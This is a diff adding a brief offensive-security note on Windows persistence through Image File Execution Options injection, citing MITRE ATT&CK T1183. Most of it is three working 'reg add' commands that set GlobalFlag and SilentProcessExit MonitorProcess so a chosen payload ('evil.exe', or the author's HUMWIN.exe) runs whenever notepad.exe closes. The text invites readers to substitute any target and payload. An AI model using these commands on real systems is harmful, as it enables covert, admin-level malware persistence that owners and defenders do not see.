@@ -1,0 +1,23 @@
+PERSISTENCE
+Persistence 
+
+https://attack.mitre.org/techniques/T1183/ Image File Execution Options Injection
+
+APT Groups - TEMP.Veles  
+ 
+Admin Access Only   
+
+The below commands will run the "evil.exe" command everytime notepad is closed - replace notepad with the program you desire and evil.exe with the program you desire - For us we will use C:\humscript\HUMWIN.exe
+
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\evil.exe"
+
+
+ 
+
+
+
+
+
+
